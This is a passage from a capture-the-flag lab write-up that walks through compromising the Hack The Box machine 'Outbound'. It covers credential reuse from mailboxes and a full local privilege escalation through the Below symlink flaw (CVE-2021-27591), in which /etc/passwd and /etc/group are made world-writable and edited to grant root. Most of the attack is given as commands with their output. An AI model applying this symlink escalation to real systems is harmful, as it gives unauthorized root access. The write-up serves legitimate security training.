empty.";}unseen_count|a:2:{s:5:"INBOX";i:2;s:5:"Trash";i:0;}folders|a:1:{s:5:"INBOX";a:2:{s:3:"cnt";i:2;s:6:"maxuid";i:3;}}list_mod_seq|s:2:"10";
```

```shell
tyler@mail:/var/www/html/roundcube/bin$ ./decrypt.sh L7Rv00A8TuwJAr67kITxxcSgnIk25Am/
</bin$ ./decrypt.sh L7Rv00A8TuwJAr67kITxxcSgnIk25Am/
595mO8DmwGeD
```

| Password     |
| ------------ |
| 595mO8DmwGeD |

```shell
tyler@mail:/var/www/html/roundcube/bin$ su jacob
su jacob
Password: 595mO8DmwGeD

jacob@mail:/var/www/html/roundcube/bin$
```

## Enumeration (jacob)

### Plaintext Credentials

With the `home directory` of `jacob` was a folder called `mail` which contained an `INBOX` for the user with one `email` send by `mel`.

She was sending `tyler` a `password` in `plaintext` via `email`.

```shell
jacob@mail:~/mail/INBOX$ cat jacob
cat jacob
From tyler@outbound.htb  Sat Jun 07 14:00:58 2025
Return-Path: <tyler@outbound.htb>
X-Original-To: jacob
Delivered-To: jacob@outbound.htb
Received: by outbound.htb (Postfix, from userid 1000)
        id B32C410248D; Sat,  7 Jun 2025 14:00:58 +0000 (UTC)
To: jacob@outbound.htb
Subject: Important Update
MIME-Version: 1.0
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: 8bit
Message-Id: <20250607140058.B32C410248D@outbound.htb>
Date: Sat,  7 Jun 2025 14:00:58 +0000 (UTC)
From: tyler@outbound.htb
X-IMAPbase: 1749304753 0000000002
X-UID: 1
Status: 
X-Keywords:                                                                       
Content-Length: 233

Due to the recent change of policies your password has been changed.

Please use the following credentials to log into your account: gY4Wr3a1evp4

Remember to change your password when you next log into your account.

Thanks!

Tyler

From mel@outbound.htb  Sun Jun 08 12:09:45 2025
Return-Path: <mel@outbound.htb>
X-Original-To: jacob
Delivered-To: jacob@outbound.htb
Received: by outbound.htb (Postfix, from userid 1002)
        id 1487E22C; Sun,  8 Jun 2025 12:09:45 +0000 (UTC)
To: jacob@outbound.htb
Subject: Unexpected Resource Consumption
MIME-Version: 1.0
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: 8bit
Message-Id: <20250608120945.1487E22C@outbound.htb>
Date: Sun,  8 Jun 2025 12:09:45 +0000 (UTC)
From: mel@outbound.htb
X-UID: 2
Status: 
X-Keywords:                                                                       
Content-Length: 261

We have been experiencing high resource consumption on our main server.
For now we have enabled resource monitoring with Below and have granted you privileges to inspect the the logs.
Please inform us immediately if you notice any irregularities.

Thanks!

Mel
```

| Password     |
| ------------ |
| gY4Wr3a1evp4 |

With the newly found `password` of `jacob` we finally logged into the box.

```shell
┌──(kali㉿kali)-[~]
└─$ ssh jacob@mail.outbound.htb
The authenticity of host 'mail.outbound.htb (10.129.229.137)' can't be established.
ED25519 key fingerprint is SHA256:OZNUeTZ9jastNKKQ1tFXatbeOZzSFg5Dt7nhwhjorR0.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:175: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'mail.outbound.htb' (ED25519) to the list of known hosts.
jacob@mail.outbound.htb's password:
Welcome to Ubuntu 24.04.2 LTS (GNU/Linux 6.8.0-63-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Sat Jul 12 08:17:43 PM UTC 2025

  System load:  0.0               Processes:             302
  Usage of /:   70.8% of 6.73GB   Users logged in:       0
  Memory usage: 14%               IPv4 address for eth0: 10.129.229.137
  Swap usage:   0%

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status

Last login: Thu Jul 10 11:44:49 2025 from 10.10.14.77
jacob@outbound:~$
```

We swiftly checked the `group memberships` as well as the `sudo permissions` of `jacob` and noticed that he could execute a binary called `Below` with higher privileges.

```shell
jacob@outbound:~$ id
uid=1002(jacob) gid=1002(jacob) groups=1002(jacob),100(users)
```

```shell
jacob@outbound:~$ sudo -l
Matching Defaults entries for jacob on outbound:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User jacob may run the following commands on outbound:
    (ALL : ALL) NOPASSWD: /usr/bin/below *, !/usr/bin/below --config*, !/usr/bin/below --debug*, !/usr/bin/below -d*
```

## user.txt

Luckily for us the `home directory` of `jacob` also contained the `user.txt` which we grabbed and moved on.

```shell
jacob@outbound:~$ cat user.txt 
287d71b6efb82c28b56ae166a4c8f6e5
```

## Privilege Escalation to root

### CVE-2021-27591: Below World Writable Directory in /var/log/below Local Privilege Escalation

We checked the official `repository` and `documentation`. That gave us the idea that we probably had to deal with some sort of `misconfiguration`.

- [https://github.com/facebookincubator/below](https://github.com/facebookincubator/below)

Our first step was to check which `options` were given to us by the currently installed version of the application.

```shell
jacob@outbound:~$ sudo /usr/bin/below -h
Usage: below [OPTIONS] [COMMAND]

Commands:
  live      Display live system data (interactive) (default)
  record    Record local system data (daemon mode)
  replay    Replay historical data (interactive)
  debug     Debugging facilities (for development use)
  dump      Dump historical data into parseable text format
  snapshot  Create a historical snapshot file for a given time range
  help      Print this message or the help of the given subcommand(s)

Options:
      --config <CONFIG>  [default: /etc/below/below.conf]
  -d, --debug            
  -h, --help             Print help
```

After a bit of tinkering and running `linpeas.sh` we found the file `error_root.log` within `/var/log/below/` which on our first look didn't contained any data.

Our mate `trustie_rity` found a blog post about a local privilege escalation in `Below` related to the `/var/log/below` directory.

- [https://security.opensuse.org/2025/03/12/below-world-writable-log-dir.html](https://security.opensuse.org/2025/03/12/below-world-writable-log-dir.html)

Next we tried to link various files to it while executing `sudo /usr/bin/below` in a second terminal window.

First we tried to link `/root/root.txt` to it but we received an `permission error`. That gave us the idea that we probably were on the right track.

So we tried to link a file which we actually could read like the `/etc/passwd` and it worked!

**Terminal Session 1**

```shell
jacob@outbound:~$ ln -sf /etc/passwd /var/log/below/error_root.log
```

```shell
jacob@outbound:~$ sudo /usr/bin/below
```

**Terminal Session 2**

```shell
jacob@outbound:~$ cat /var/log/below/error_root.log
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:101:102::/nonexistent:/usr/sbin/nologin
systemd-resolve:x:992:992:systemd Resolver:/:/usr/sbin/nologin
pollinate:x:102:1::/var/cache/pollinate:/bin/false
polkitd:x:991:991:User for polkitd:/:/usr/sbin/nologin
syslog:x:103:104::/nonexistent:/usr/sbin/nologin
uuidd:x:104:105::/run/uuidd:/usr/sbin/nologin
tcpdump:x:105:107::/nonexistent:/usr/sbin/nologin
tss:x:106:108:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:107:109::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:989:989:Firmware update daemon:/var/lib/fwupd:/usr/sbin/nologin
usbmux:x:108:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
_laurel:x:999:988::/var/log/laurel:/bin/false
mel:x:1000:1000:,,,:/home/mel:/bin/bash
tyler:x:1001:1001:,,,:/home/tyler:/bin/bash
jacob:x:1002:1002:,,,:/home/jacob:/bin/bash
```

After we checked the `permissions` of the file we saw that that they were changed which granted us `write permissions` on it.

```shell
jacob@outbound:~$ ls -lah /etc/passwd
-rw-rw-rw- 1 root root 1.8K Jul 12 21:26 /etc/passwd
```

Next our mate `Bushidosan` came up with a great idea of abusing the `groups` to grant ourselves full `sudo privileges`.

**Terminal Session 1**

```shell
jacob@outbound:~$ ln -sf /etc/group /var/log/below/error_root.log
```

```shell
jacob@outbound:~$ sudo /usr/bin/below
```

**Terminal Session 2**

```shell
jacob@outbound:~$ cat /var/log/below/error_root.log
root:x:0:
daemon:x:1:
bin:x:2:
sys:x:3:
adm:x:4:syslog
tty:x:5:
disk:x:6:
lp:x:7:
mail:x:8:
news:x:9:
uucp:x:10:
man:x:12:
proxy:x:13:
kmem:x:15:
dialout:x:20:
fax:x:21:
voice:x:22:
cdrom:x:24:
floppy:x:25:
tape:x:26:
sudo:x:27:
audio:x:29:
dip:x:30:
www-data:x:33:
backup:x:34:
operator:x:37:
list:x:38:
irc:x:39:
src:x:40:
shadow:x:42:
utmp:x:43:
video:x:44:
sasl:x:45:
plugdev:x:46:
staff:x:50:
games:x:60:
users:x:100:mel,tyler,jacob
nogroup:x:65534:
systemd-journal:x:999:
systemd-network:x:998:
systemd-timesync:x:997:
input:x:996:
sgx:x:995:
kvm:x:994:
render:x:993:
lxd:x:101:
messagebus:x:102:
systemd-resolve:x:992:
_ssh:x:103:
polkitd:x:991:
crontab:x:990:
syslog:x:104:
uuidd:x:105:
rdma:x:106:
tcpdump:x:107:
tss:x:108:
landscape:x:109:
fwupd-refresh:x:989:
netdev:x:110:
_laurel:x:988:
docker:x:987:
mel:x:1000:
tyler:x:1001:
jacob:x:1002:
```

While in **Terminal Session 1** the application was still running using `sudo` we checked the `permissions` on `/etc/group` and they changed too.

```shell
jacob@outbound:~$ ls -lah /etc/group
-rw-rw-rw- 1 root root 864 Jul 12 21:18 /etc/group
```

So we went for it and edited the file to add `jacob` to the `group` of `sudo`.

```shell
jacob@outbound:~$ vi /etc/group
```

```shell
jacob@outbound:~$ cat /etc/group
root:x:0:
daemon:x:1:
bin:x:2:
sys:x:3:
adm:x:4:syslog
tty:x:5:
disk:x:6:
lp:x:7:
mail:x:8:
news:x:9:
uucp:x:10:
man:x:12:
proxy:x:13:
kmem:x:15:
dialout:x:20:
fax:x:21:
voice:x:22:
cdrom:x:24:
floppy:x:25:
tape:x:26:
sudo:x:27:jacob
audio:x:29:
dip:x:30:
www-data:x:33:
backup:x:34:
operator:x:37:
list:x:38:
irc:x:39:
src:x:40:
shadow:x:42:
utmp:x:43:
video:x:44:
sasl:x:45:
plugdev:x:46:
staff:x:50:
games:x:60:
users:x:100:mel,tyler,jacob
nogroup:x:65534:
systemd-journal:x:999:
systemd-network:x:998:
systemd-timesync:x:997:
input:x:996:
sgx:x:995:
kvm:x:994:
render:x:993:
lxd:x:101:
messagebus:x:102:
systemd-resolve:x:992:
_ssh:x:103:
polkitd:x:991:
crontab:x:990:
syslog:x:104:
uuidd:x:105:
rdma:x:106:
tcpdump:x:107:
tss:x:108:
landscape:x:109:
fwupd-refresh:x:989:
netdev:x:110:
_laurel:x:988:
docker:x:987:
mel:x:1000:
tyler:x:1001:
jacob:x:1002:
```

In order to make the changes actually working we needed to `relog` which we realized by simply starting a third session.

```shell
┌──(kali㉿kali)-[~]
└─$ ssh jacob@mail.outbound.htb
jacob@mail.outbound.htb's password: 
Welcome to Ubuntu 24.04.2 LTS (GNU/Linux 6.8.0-63-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Sat Jul 12 09:18:58 PM UTC 2025

  System load:  0.19              Processes:             323
  Usage of /:   71.9% of 6.73GB   Users logged in:       1
  Memory usage: 19%               IPv4 address for eth0: 10.129.229.137
  Swap usage:   0%


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Sat Jul 12 21:17:53 2025 from 10.10.16.48
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

jacob@outbound:~$
```

And as expected it worked just fine!

```shell
jacob@outbound:~$ sudo su
[sudo] password for jacob: 
root@outbound:/home/jacob#
```

## root.txt

```shell
root@outbound:~# cat /root/root.txt
6cd2de5ce2351ea9a37f9aa97ab3723a
```
